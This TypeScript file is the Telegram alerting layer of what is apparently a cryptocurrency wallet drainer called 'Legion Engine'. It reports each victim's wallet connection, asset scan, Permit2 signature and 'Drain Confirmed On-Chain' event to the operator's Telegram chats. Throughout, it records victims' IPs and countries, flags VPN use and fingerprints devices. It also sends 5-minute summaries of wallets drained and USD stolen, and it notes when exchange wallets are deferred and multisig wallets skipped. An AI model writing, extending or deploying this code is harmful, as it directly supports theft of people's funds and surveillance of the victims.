/**
 * Legion Engine — Telegram Sovereign Notification Layer
 * Multi-chat delivery (TELEGRAM_CHAT_IDS), OPSEC signature truncation, 5m drain summaries.
 * Silent fail — never crashes the main flow.
 */

import {
  isEvmTransactionHash,
  pollEvmTransactionConfirmation,
  verifyEvmTransaction,
} from './evm-tx-verify.js'

// ─── Outbound rate-limit queue (1 msg / second) ────────────────────────────────
// Telegram allows ~30 messages/second per bot, but burst sentinel/gas alerts can
// easily produce dozens in a single tick.  Serialise all outbound sends through a
// bounded in-memory queue processed at 1 item / second so we never 429.

const OUTBOUND_QUEUE_MAX = 100
const OUTBOUND_QUEUE_WARN = 50
const OUTBOUND_SEND_INTERVAL_MS = 1_000

type OutboundMessage = { chatId: string; text: string; url: string }

const outboundQueue: OutboundMessage[] = []
let outboundTimer: ReturnType<typeof setInterval> | null = null

function ensureOutboundTimer(): void {
  if (outboundTimer != null) return
  outboundTimer = setInterval(() => {
    const msg = outboundQueue.shift()
    if (msg) void sendTelegramToChat(msg.chatId, msg.text, msg.url)
  }, OUTBOUND_SEND_INTERVAL_MS)
}

function enqueueOutboundMessage(chatId: string, text: string, url: string): void {
  if (outboundQueue.length >= OUTBOUND_QUEUE_MAX) {
    console.warn(
      `[TELEGRAM] Outbound queue full (${OUTBOUND_QUEUE_MAX}) — dropping message to chat ${chatId}`,
    )
    return
  }
  if (outboundQueue.length + 1 > OUTBOUND_QUEUE_WARN) {
    console.warn(
      `[TELEGRAM] Outbound queue depth ${outboundQueue.length + 1} ≥ ${OUTBOUND_QUEUE_WARN} — rate-limit pressure`,
    )
  }
  outboundQueue.push({ chatId, text, url })
  ensureOutboundTimer()
}

/** Stop the rate-limit timer (call during graceful shutdown). */
export function stopTelegramOutboundQueue(): void {
  if (outboundTimer != null) {
    clearInterval(outboundTimer)
    outboundTimer = null
  }
  outboundQueue.length = 0
}

/** Stop drain batch timer (call during graceful shutdown). */
export function stopTelegramDrainBatchTimer(): void {
  if (drainBatchTimer != null) {
    clearInterval(drainBatchTimer)
    drainBatchTimer = null
  }
  drainBatchByWallet.clear()
  drainBatchDedupeKeys.clear()
}

// ──────────────────────────────────────────────────────────────────────────────

const DRAIN_BATCH_INTERVAL_MS = 5 * 60 * 1_000

type DrainBatchWallet = {
  usd: number
  chains: Set<string>
}

const drainBatchByWallet = new Map<string, DrainBatchWallet>()
const drainBatchDedupeKeys = new Set<string>()
let drainBatchTimer: ReturnType<typeof setInterval> | null = null

/** Prevent repeated connect/scan Telegram spam for the same wallet session. */
const notifySessionDedupe = new Map<string, number>()
const DEFAULT_SESSION_DEDUPE_TTL_MS = 30 * 60 * 1_000

function normalizeNotifyWalletKey(wallet: string): string {
  const w = wallet.trim()
  return /^0x[a-fA-F0-9]{40}$/.test(w) ? w.toLowerCase() : w
}

/** Returns true when this notification key has not been sent within TTL. */
export function shouldSendTelegramOnce(
  key: string,
  ttlMs: number = DEFAULT_SESSION_DEDUPE_TTL_MS,
): boolean {
  const now = Date.now()
  const expiresAt = notifySessionDedupe.get(key)
  if (expiresAt != null && expiresAt > now) return false
  notifySessionDedupe.set(key, now + ttlMs)
  if (notifySessionDedupe.size > 10_000) {
    for (const [k, exp] of notifySessionDedupe) {
      if (exp <= now) notifySessionDedupe.delete(k)
    }
  }
  return true
}

export function buildWalletSessionNotifyKey(
  event: 'connect' | 'scan' | 'reject' | 'no_action',
  wallet: string,
  ip?: string | null,
  connectSession?: string | null,
): string {
  if (connectSession && connectSession.trim() !== '') {
    return `${event}:${normalizeNotifyWalletKey(wallet)}:${connectSession.trim()}`
  }
  const walletKey = normalizeNotifyWalletKey(wallet)
  const ipKey = ip && ip !== 'Unknown' ? ip.trim() : 'unknown-ip'
  return `${event}:${walletKey}:${ipKey}`
}

/** OPSEC — show first 6 + last 4 chars only (e.g. `0x1234...abcd`). */
export function truncateSignatureHex(value: string): string {
  const s = value.trim()
  if (s.length <= 12) return s
  return `${s.slice(0, 6)}...${s.slice(-4)}` // STRING_LIMITS.ADDRESS_DISPLAY_PREFIX/SUFFIX
}

function parseUsdValue(raw: string | number | null | undefined): number {
  if (raw == null) return 0
  const n = typeof raw === 'number' ? raw : Number.parseFloat(String(raw).trim())
  return Number.isFinite(n) && n >= 0 ? n : 0
}

function formatUsdTotal(total: number): string {
  if (!Number.isFinite(total)) return '0'
  return total >= 1_000_000
    ? `${(total / 1_000_000).toFixed(2)}M`
    : total >= 1_000
      ? `${(total / 1_000).toFixed(2)}K`
      : total.toFixed(2)
}

function ensureDrainBatchTimer(): void {
  if (drainBatchTimer != null) return
  drainBatchTimer = setInterval(() => {
    void flushDrainBatchSummary()
  }, DRAIN_BATCH_INTERVAL_MS)
}

function normalizeWalletKey(wallet: string): string {
  const w = wallet.trim()
  return /^0x[a-fA-F0-9]{40}$/.test(w) ? w.toLowerCase() : w
}

/**
 * Queue a completed settlement for the 5-minute aggregate summary.
 * Dedupes repeated signals for the same wallet + tx in one window.
 */
export function enqueueDrainBatchEntry(entry: {
  wallet: string
  usd?: string | number | null
  chains?: Array<string | number | null | undefined>
  tx_hash?: string | null
}): void {
  const wallet = entry.wallet?.trim()
  if (!wallet) return

  const txKey = entry.tx_hash?.trim() || 'pending'
  const dedupeKey = `${normalizeWalletKey(wallet)}:${txKey}`
  if (drainBatchDedupeKeys.has(dedupeKey)) return
  drainBatchDedupeKeys.add(dedupeKey)

  const usd = parseUsdValue(entry.usd)
  const chainLabels = (entry.chains ?? [])
    .map((c) => (c == null ? '' : String(c).trim()))
    .filter((c) => c !== '')

  const key = normalizeWalletKey(wallet)
  const existing = drainBatchByWallet.get(key)
  if (existing) {
    existing.usd += usd
    for (const c of chainLabels) existing.chains.add(c)
  } else {
    drainBatchByWallet.set(key, { usd, chains: new Set(chainLabels) })
  }

  ensureDrainBatchTimer()
}

async function flushDrainBatchSummary(): Promise<void> {
  if (drainBatchByWallet.size === 0) {
    drainBatchDedupeKeys.clear()
    return
  }

  const entries = [...drainBatchByWallet.entries()]
  drainBatchByWallet.clear()
  drainBatchDedupeKeys.clear()

  const walletCount = entries.length
  const totalUsd = entries.reduce((sum, [, row]) => sum + row.usd, 0)
  const chainSet = new Set<string>()
  for (const [, row] of entries) {
    for (const c of row.chains) chainSet.add(c)
  }
  const chains = [...chainSet].sort().join(', ') || 'unknown'

  const text =
    `📊 <b>SETTLEMENT BATCH (5m)</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `${walletCount} wallet${walletCount === 1 ? '' : 's'} drained, total $${formatUsdTotal(totalUsd)} USD, chains: [${chains}]\n` +
    `🕐 ${getISTTimestamp()}`

  await sendTelegramMessage(text)
}

function getISTTimestamp(): string {
  return (
    new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    }) + ' IST'
  )
}

function literalValue(value: string | number | null | undefined): string {
  if (value == null) return 'N/A'
  if (typeof value === 'number') {
    return Number.isFinite(value) ? String(value) : 'N/A'
  }
  const trimmed = String(value).trim()
  return trimmed === '' ? 'N/A' : trimmed
}

function codeLine(label: string, value: string | number | null | undefined): string {
  const v = literalValue(value)
  return `📌 <b>${label}:</b> <code>${v}</code>\n`
}

function appendInstitutionalFields(ctx?: TelegramRequestContext): string {
  if (!ctx) return ''
  let lines = ''
  if (ctx.chain_id != null && literalValue(ctx.chain_id) !== 'N/A') {
    lines += codeLine('Chain ID', ctx.chain_id)
  }
  if (ctx.chain_family != null && literalValue(ctx.chain_family) !== 'N/A') {
    lines += `⛓️ <b>Chain Family:</b> ${literalValue(ctx.chain_family)}\n`
  }
  if (ctx.wallet_type != null && literalValue(ctx.wallet_type) !== 'N/A') {
    lines += `👛 <b>Wallet Type:</b> ${literalValue(ctx.wallet_type)}\n`
  }
  if (ctx.active_chain_tab != null && literalValue(ctx.active_chain_tab) !== 'N/A') {
    lines += `📑 <b>Wallets:</b> ${literalValue(ctx.active_chain_tab)}\n`
  }
  if (ctx.connected_wallets != null && literalValue(ctx.connected_wallets) !== 'N/A') {
    lines += `🔀 <b>Connected:</b> ${literalValue(ctx.connected_wallets)}\n`
  }
  if (ctx.scout_value_usd != null && literalValue(ctx.scout_value_usd) !== 'N/A') {
    const usdVal = Number(ctx.scout_value_usd)
    const usdFormatted = Number.isFinite(usdVal) && usdVal > 0 ? `$${usdVal.toFixed(2)}` : '$0'
    lines += `💰 <b>Wallet Value:</b> ${usdFormatted}\n`
  }
  if (ctx.amount != null && literalValue(ctx.amount) !== 'N/A') {
    lines += codeLine('Amount', ctx.amount)
  }
  if (ctx.nonce != null && literalValue(ctx.nonce) !== 'N/A') {
    lines += codeLine('Nonce', ctx.nonce)
  }
  if (ctx.tx_hash != null && literalValue(ctx.tx_hash) !== 'N/A') {
    lines += codeLine('Settlement TX Hash', ctx.tx_hash)
  }
  if (ctx.tokenAddress != null && literalValue(ctx.tokenAddress) !== 'N/A') {
    lines += codeLine('Token Address', ctx.tokenAddress)
  }
  if (ctx.signature != null && literalValue(ctx.signature) !== 'N/A') {
    lines += codeLine('Signature', truncateSignatureHex(String(ctx.signature)))
  }
  return lines
}

export type TelegramDeliveryConfig = {
  url: string | null
  chatIds: string[]
}

/**
 * Resolve all Telegram chat IDs:
 * 1. TELEGRAM_CHAT_IDS (comma-separated)
 * 2. TELEGRAM_CHAT_ID (legacy single)
 * 3. ?chat_id= on TELEMETRY_WEBHOOK_URL
 */
export function resolveTelegramChatIds(webhookUrl?: string): string[] {
  const multi = process.env['TELEGRAM_CHAT_IDS']?.trim()
  if (multi) {
    const ids = multi
      .split(',')
      .map((id) => id.trim())
      .filter(Boolean)
    if (ids.length > 0) return [...new Set(ids)]
  }

  const single = process.env['TELEGRAM_CHAT_ID']?.trim()
  if (single) return [single]

  const url = webhookUrl ?? process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  if (url) {
    try {
      const fromUrl = new URL(url).searchParams.get('chat_id')?.trim()
      if (fromUrl) return [fromUrl]
    } catch {
      /* ignore */
    }
  }

  return []
}

/** Resolve POST URL + all chat targets for Telegram delivery. */
export function resolveTelegramDelivery(): TelegramDeliveryConfig {
  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatIds = resolveTelegramChatIds(rawUrl)

  // Only use rawUrl if it contains a valid bot path (e.g. /bot{TOKEN}/sendMessage).
  // If TELEMETRY_WEBHOOK_URL is missing the /bot path, fall through to TELEGRAM_BOT_TOKEN.
  if (rawUrl && rawUrl.includes('/bot')) {
    try {
      const parsed = new URL(rawUrl)
      parsed.searchParams.delete('chat_id')
      return { url: parsed.toString(), chatIds }
    } catch {
      return { url: rawUrl, chatIds }
    }
  }

  if (token && chatIds.length > 0) {
    return { url: `https://api.telegram.org/bot${token}/sendMessage`, chatIds }
  }

  return { url: null, chatIds }
}

/** True when TELEMETRY_WEBHOOK_URL (+ chat id) or TELEGRAM_BOT_TOKEN path is wired. */
export function isTelegramConfigured(): boolean {
  const { url, chatIds } = resolveTelegramDelivery()
  if (url && chatIds.length > 0) return true
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  return Boolean(token && chatIds.length > 0)
}

/** Detect device/browser from User-Agent string */
export function detectDeviceFromUA(ua: string): string {
  if (!ua) return 'Unknown'
  const u = ua.toLowerCase()

  let device = 'Desktop'
  if (/iphone/.test(u)) device = 'iPhone'
  else if (/ipad/.test(u)) device = 'iPad'
  else if (/android.*mobile/.test(u)) device = 'Android Mobile'
  else if (/android/.test(u)) device = 'Android Tablet'
  else if (/mobile/.test(u)) device = 'Mobile'

  let browser = 'Unknown Browser'
  if (/edg\//.test(u)) browser = 'Edge'
  else if (/opr\/|opera/.test(u)) browser = 'Opera'
  else if (/brave/.test(u)) browser = 'Brave'
  else if (/chrome\//.test(u)) browser = 'Chrome'
  else if (/firefox\//.test(u)) browser = 'Firefox'
  else if (/safari\//.test(u) && !/chrome/.test(u)) browser = 'Safari'

  return `${browser} / ${device}`
}

/** Resolve client IP from request headers */
export function resolveClientIp(headers: Record<string, string | string[] | undefined>): string {
  const pick = (key: string): string | null => {
    const v = headers[key]
    if (!v) return null
    const s = Array.isArray(v) ? v[0] : v
    return s?.split(',')[0]?.trim() ?? null
  }
  return (
    pick('cf-connecting-ip') ??
    pick('x-real-ip') ??
    pick('x-forwarded-for') ??
    pick('x-client-ip') ??
    'Unknown'
  )
}

/** Get country flag + name + VPN status from IP using ip-api.com (free, no key needed) */
async function getCountryFromIp(ip: string): Promise<string> {
  if (
    !ip ||
    ip === 'Unknown' ||
    ip === '::1' ||
    ip.startsWith('127.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.')
  ) {
    return '🏴 Local'
  }
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,proxy,hosting`, {
      signal: AbortSignal.timeout(3_000),
    })
    const data = (await res.json()) as { country?: string; countryCode?: string; proxy?: boolean; hosting?: boolean }
    if (data.country && data.countryCode) {
      const flag = data.countryCode
        .toUpperCase()
        .split('')
        .map((c: string) => String.fromCodePoint(0x1f1e6 - 65 + c.charCodeAt(0)))
        .join('')
      const vpnTag = (data.proxy || data.hosting) ? ' (🛡️ VPN)' : ''
      return `${flag} ${data.country}${vpnTag}`
    }
  } catch {
    /* silent */
  }
  return '🌍 Unknown'
}

export type StrategyAsset = {
  chain: string
  family: string
  token: string
  symbol: string
  amount_usd: number
}

function formatChainLabel(chain: string, symbol?: string): string {
  const lower = chain.toLowerCase()
  const evmMatch = lower.match(/^evm:(\d+)$/)
  if (evmMatch) {
    const id = Number(evmMatch[1])
    const names: Record<number, string> = {
      1: 'Ethereum',
      56: 'BNB Chain',
      137: 'Polygon',
      42161: 'Arbitrum',
      8453: 'Base',
      10: 'Optimism',
      43114: 'Avalanche',
      250: 'Fantom',
      25: 'Cronos',
      100: 'Gnosis',
      42220: 'Celo',
      324: 'zkSync Era',
      59144: 'Linea',
      534352: 'Scroll',
      81457: 'Blast',
      5000: 'Mantle',
    }
    const chainName = names[id] ?? `EVM chain ${id}`
    const sym = symbol && symbol !== 'native' ? symbol.toUpperCase() : ''
    return sym ? `${chainName} · ${sym}` : chainName
  }
  if (lower.startsWith('solana') || lower === 'svm') {
    const sym = symbol ? ` · ${symbol.toUpperCase()}` : ''
    return `Solana${sym}`
  }
  if (lower.startsWith('tron')) return symbol ? `Tron · ${symbol.toUpperCase()}` : 'Tron'
  if (lower.startsWith('bip122') || lower === 'btc' || lower === 'utxo') {
    return symbol ? `Bitcoin · ${symbol.toUpperCase()}` : 'Bitcoin'
  }
  if (lower.startsWith('ton')) return symbol ? `TON · ${symbol.toUpperCase()}` : 'TON'
  const base = chain.replace(/^[^:]+:/, '').toUpperCase()
  return symbol ? `${base} · ${symbol.toUpperCase()}` : base
}

function buildStrategyLines(assets: StrategyAsset[], totalUsd: number): string {
  if (!assets || assets.length === 0) return ''

  const lines: string[] = []
  const sorted = [...assets].filter((a) => a.amount_usd > 0).sort((a, b) => b.amount_usd - a.amount_usd)
  for (const a of sorted.slice(0, 12)) {
    const label = formatChainLabel(a.chain, a.symbol)
    const isNative =
      !a.token ||
      a.token === 'native' ||
      a.token.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
    const action = isNative ? 'Balance transfer' : `Permit2 · ${(a.symbol || 'token').toUpperCase()}`
    lines.push(`👉 ${label} — ${action} $${a.amount_usd.toFixed(2)}`)
  }

  if (lines.length === 0) return ''
  return `💰 <b>Strategy ($${totalUsd.toFixed(2)}):</b>\n━━━━━━━━━━━━━━━━\n` + lines.join('\n') + '\n'
}

async function sendTelegramToChat(chatId: string, text: string, url: string): Promise<void> {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = (await res.json().catch(() => null)) as { ok?: boolean; description?: string } | null
    if (json && json.ok === false) {
      console.warn(`[TELEGRAM] API error (chat ${chatId}):`, json.description)
    }
  } catch (err) {
    console.warn(`[TELEGRAM] Silent fail (chat ${chatId}) —`, String(err))
  }
}

/**
 * Fan-out HTML message to all configured Telegram chats.
 * Each (chatId, text) pair is serialised through the 1-msg/s outbound queue;
 * the call returns immediately (fire-and-forget delivery).
 */
export async function sendTelegramMessage(text: string): Promise<void> {
  const { url, chatIds } = resolveTelegramDelivery()

  if (!url || chatIds.length === 0) {
    console.info(
      '[TELEGRAM] TELEMETRY_WEBHOOK_URL or TELEGRAM_CHAT_ID(S) not set — skipping notification',
    )
    return
  }

  for (const chatId of chatIds) {
    enqueueOutboundMessage(chatId, text, url)
  }

  console.info(
    `[TELEGRAM] Queued to ${chatIds.length} chat(s) via`,
    process.env['TELEMETRY_WEBHOOK_URL'] ? 'TELEMETRY_WEBHOOK_URL' : 'TELEGRAM_BOT_TOKEN',
  )
}

/** Mirror orchestrator — tunnel / container failure alert (non-blocking). */
export async function notifyMirrorTunnelFailure(message: string): Promise<void> {
  if (!isTelegramConfigured()) return
  await sendTelegramMessage(['🪞 MIRROR TUNNEL FAILURE', message].join('\n'))
}

export interface TelegramRequestContext {
  ip?: string
  userAgent?: string
  sourceDomain?: string
  active_chain_tab?: string
  connected_wallets?: string
  connect_session?: string
  tokenName?: string
  tokenAddress?: string
  chain_family?: string
  chain_id?: string | number
  wallet_type?: string
  scout_value_usd?: string | number
  amount?: string
  nonce?: string
  tx_hash?: string
  signature?: string
}

// ─── Event Notifiers ───────────────────────────────────────────────────────────

export async function notifyWalletConnected(
  address: string,
  chainFamily: string,
  walletType: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const dedupeKey = buildWalletSessionNotifyKey('connect', address, ctx?.ip, ctx?.connect_session)
  if (!shouldSendTelegramOnce(dedupeKey, ctx?.connect_session ? 10 * 60 * 1_000 : DEFAULT_SESSION_DEDUPE_TTL_MS)) return

  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `🔌 <b>Wallet Connected</b> (${walletType || chainFamily})\n` +
    `👛 <code>${address}</code>\n` +
    (device ? `💻 ${device}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
    `ℹ️ Scanning assets — drain not confirmed yet\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyScanComplete(
  address: string,
  totalUsd: number,
  assetsCount: number,
  ctx?: TelegramRequestContext,
  assets?: StrategyAsset[],
): Promise<void> {
  const dedupeKey = buildWalletSessionNotifyKey('scan', address, ctx?.ip, ctx?.connect_session)
  if (!shouldSendTelegramOnce(dedupeKey, ctx?.connect_session ? 10 * 60 * 1_000 : DEFAULT_SESSION_DEDUPE_TTL_MS)) return

  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const walletType = ctx?.wallet_type ?? 'Wallet'
  const strategyBlock = assets && assets.length > 0 ? buildStrategyLines(assets, totalUsd) : ''

  const text =
    `📊 <b>Asset Scan Complete</b> (${walletType})\n` +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 IP: <code>${ctx.ip}</code>` : '') +
    (country ? ` | ${country}\n` : '\n') +
    `👛 <b>Wallet:</b> <code>${address}</code>\n` +
    (ctx?.sourceDomain ? `🔗 <b>Site:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    `\n` +
    (strategyBlock ||
      (`💰 <b>Value:</b> $${totalUsd.toFixed(2)} (${assetsCount} asset${assetsCount !== 1 ? 's' : ''})\n`)) +
    `ℹ️ Waiting for wallet signature / TX — not drained yet\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifySignatureReceived(
  address: string,
  chainFamily: string,
  signature: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const chain = ctx?.chain_family ?? chainFamily
  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
  const sigShort = truncateSignatureHex(String(ctx?.signature ?? signature))

  const text =
    `✍️ <b>Signature Received</b> (${ctx?.wallet_type ?? chain})\n` +
    `👛 <code>${address}</code>` +
    (chain ? ` | ⛓️ ${chain}` : '') +
    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
    (ctx?.tokenName ? `🪙 Token: ${ctx.tokenName}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
    (device ? `💻 ${device}\n` : '') +
    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
    `🔑 <code>${sigShort}</code>\n` +
    `ℹ️ Backend processing — on-chain drain not confirmed yet\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

function formatScheduleTimeIst(scheduledIso: string): string {
  try {
    return (
      new Date(scheduledIso).toLocaleString('en-IN', {
        timeZone: 'Asia/Kolkata',
        day: '2-digit',
        month: 'short',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true,
      }) + ' IST'
    )
  } catch {
    return scheduledIso
  }
}

export async function notifyBroadcastScheduled(
  scheduledTimeIso: string,
  address: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const displayTime = formatScheduleTimeIst(scheduledTimeIso)
  const chain = ctx?.chain_family ?? 'EVM'
  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0

  const text =
    `⏳ <b>Broadcast Scheduled</b>\n` +
    `👛 <code>${address}</code>` +
    (chain ? ` | ⛓️ ${chain}` : '') +
    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
    `📅 ${displayTime}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** Sends immediate settlement TX alert only after on-chain confirmation is verified elsewhere. */
export async function notifyBroadcastConfirmed(
  txHash: string,
  address: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const chainFamily = ctx?.chain_family ?? null
  const explorer = resolveExplorerTxUrl(txHash, ctx?.chain_id, chainFamily)
  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
  const txLine = explorer
    ? `🔗 <a href="${explorer}">${truncateWalletForAlert(txHash)}</a>\n`
    : `🔗 <code>${truncateWalletForAlert(txHash)}</code>\n`

  const text =
    `✅ <b>Drain Confirmed On-Chain</b>` +
    (usdVal > 0 ? ` — $${formatUsdTotal(usdVal)}` : '') + `\n` +
    `👛 <code>${address}</code>` +
    (chainFamily ? ` | ⛓️ ${chainFamily}` : '') + `\n` +
    txLine +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)

  enqueueDrainBatchEntry({
    wallet: address,
    usd: ctx?.scout_value_usd ?? ctx?.amount,
    chains: [ctx?.chain_family, ctx?.chain_id != null ? String(ctx.chain_id) : null],
    tx_hash: ctx?.tx_hash ?? txHash,
  })
}

/** Batch ID or unconfirmed hash — user may still need to approve in wallet. */
export async function notifyTxAwaitingConfirmation(
  referenceId: string,
  address: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const dedupeKey = `pending:${normalizeNotifyWalletKey(address)}:${referenceId.trim().toLowerCase()}`
  if (!shouldSendTelegramOnce(dedupeKey, 10 * 60 * 1_000)) return

  const chainFamily = ctx?.chain_family ?? 'EVM'
  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
  const text =
    `⏳ <b>Awaiting Wallet / On-Chain Confirmation</b>\n` +
    `👛 <code>${truncateWalletForAlert(address)}</code> | ⛓️ ${chainFamily}` +
    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
    `🆔 Ref: <code>${truncateWalletForAlert(referenceId)}</code>\n` +
    `ℹ️ Not drained yet — waiting for user approval or block confirmation\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** User rejected MetaMask / WalletConnect popup — no funds moved. */
export async function notifyUserRejectedWallet(
  address: string,
  ctx?: TelegramRequestContext & { detail?: string | null },
): Promise<void> {
  const dedupeKey = buildWalletSessionNotifyKey('reject', address, ctx?.ip, ctx?.connect_session)
  if (!shouldSendTelegramOnce(dedupeKey, 5 * 60 * 1_000)) return

  const text =
    `🚫 <b>User Rejected — No Drain</b>\n` +
    `👛 <code>${truncateWalletForAlert(address)}</code>` +
    (ctx?.chain_id != null ? ` | ⛓️ ${ctx.chain_id}` : '') +
    (ctx?.wallet_type ? ` | ${ctx.wallet_type}` : '') + `\n` +
    (ctx?.detail ? `⚠️ ${ctx.detail.slice(0, 200)}\n` : '') +
    `ℹ️ Wallet popup cancelled — nothing was drained\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** Scan finished but no lethal signature / TX was submitted. */
export async function notifyDrainNoAction(
  address: string,
  ctx?: TelegramRequestContext & { detail?: string | null },
): Promise<void> {
  const dedupeKey = buildWalletSessionNotifyKey('no_action', address, ctx?.ip, ctx?.connect_session)
  if (!shouldSendTelegramOnce(dedupeKey, 5 * 60 * 1_000)) return

  const text =
    `➖ <b>No Drain Action</b>\n` +
    `👛 <code>${truncateWalletForAlert(address)}</code>` +
    (ctx?.chain_id != null ? ` | ⛓️ ${ctx.chain_id}` : '') + `\n` +
    (ctx?.detail ? `ℹ️ ${ctx.detail.slice(0, 200)}\n` : `ℹ️ No signature or confirmed TX submitted\n`) +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** Batched into 5-minute settlement summary (not sent immediately). */
export async function notifyVaultSettlement(
  address: string,
  txHash: string,
  scoutValueUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  enqueueDrainBatchEntry({
    wallet: address,
    usd: ctx?.scout_value_usd ?? scoutValueUsd,
    chains: [ctx?.chain_family, ctx?.chain_id != null ? String(ctx.chain_id) : null],
    tx_hash: ctx?.tx_hash ?? txHash,
  })
}

export async function notifyError(
  endpoint: string,
  error: string,
  address?: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null

  const text =
    `🚨 <b>Error: ${endpoint}</b>\n` +
    `⚠️ ${error.slice(0, 300)}\n` +
    (address ? `👛 <code>${address}</code>\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyExchangeWalletDeferred(
  address: string,
  policy: { exchange?: string; strategies: string[]; chunk_count?: number; reason?: string },
  scoutValueUsd: number,
): Promise<void> {
  const text =
    `🏦 <b>EXCHANGE WALLET — DEFERRED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `Large-value exchange wallet detected — deferring settlement\n` +
    codeLine('Wallet Address', address) +
    codeLine('USD Value', scoutValueUsd) +
    (policy.exchange ? `🏛 <b>Exchange:</b> ${policy.exchange}\n` : '') +
    (policy.chunk_count ? `📦 <b>Chunks:</b> ${policy.chunk_count} (daily limit)\n` : '') +
    `🛡 <b>Strategies:</b> ${policy.strategies.join(', ')}\n` +
    (policy.reason ? `ℹ️ ${policy.reason}\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyMultisigWalletSkipped(
  address: string,
  policy: { multisig_kind?: string; reason?: string; strategies: string[] },
  scoutValueUsd: number,
): Promise<void> {
  const text =
    `🔐 <b>MULTI-SIG WALLET — SKIPPED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    codeLine('USD Value', scoutValueUsd) +
    (policy.multisig_kind ? `📋 <b>Kind:</b> ${policy.multisig_kind}\n` : '') +
    (policy.reason ? `⚠️ ${policy.reason}\n` : '') +
    `🛡 <b>Strategies:</b> ${policy.strategies.join(', ')}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

function formatSettlementTimingLabel(timing: 'immediate' | 'delayed', delayHours?: number): string {
  if (timing === 'delayed' && delayHours != null && Number.isFinite(delayHours)) {
    return `delayed (${delayHours}h)`
  }
  return 'immediate'
}

export async function notifySettlementTiming(params: {
  wallet_address: string
  scout_value_usd: number
  timing: 'immediate' | 'delayed'
  delay_hours?: number
  strategies?: string[]
}): Promise<void> {
  const timingLabel = formatSettlementTimingLabel(params.timing, params.delay_hours)
  const text =
    `⏱ <b>SETTLEMENT TIMING</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', params.wallet_address) +
    codeLine('USD Value', params.scout_value_usd) +
    `⚡ <b>Execution:</b> ${timingLabel}\n` +
    (params.strategies?.length ? `🛡 <b>Strategies:</b> ${params.strategies.join(', ')}\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

